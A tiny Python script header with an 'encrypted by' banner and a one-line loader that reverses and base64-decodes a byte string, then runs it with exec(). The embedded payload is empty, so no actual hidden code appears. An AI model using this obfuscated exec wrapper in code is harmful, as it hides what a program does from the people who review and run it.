
#ENCRYPTED BY :CYB3R SOJIB
#VERSION :ALPHA
#GITHUB : https://github.com/K1NG-SOJIB-69
#FEEL THE POWER OF SOJIB..
# Time : Fri May 26 23:59:26 2023
# -------------------------------
###------------------------------MAIN>MENU-----------------------------###

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))